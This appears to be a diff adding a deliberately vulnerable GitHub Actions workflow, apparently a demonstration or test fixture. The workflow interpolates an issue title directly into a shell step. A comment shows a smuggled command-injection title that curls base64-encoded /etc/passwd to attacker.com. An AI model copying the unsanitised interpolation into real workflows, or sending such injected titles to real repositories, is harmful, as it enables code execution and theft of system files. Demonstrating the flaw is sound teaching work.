@@ -1,0 +1,14 @@
+name: Vulnerable Workflow
+on:
+  issues:
+    types: [opened]
+jobs:
+  vulnerable_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Vulnerable Step
+        run: |
+          # The following line is vulnerable to command injection.
+          # An attacker can create an issue with a title like:
+          # '; curl http://attacker.com/$(cat /etc/passwd | base64)'
+          echo "Running command with issue title: ${{ github.event.issue.title }}"
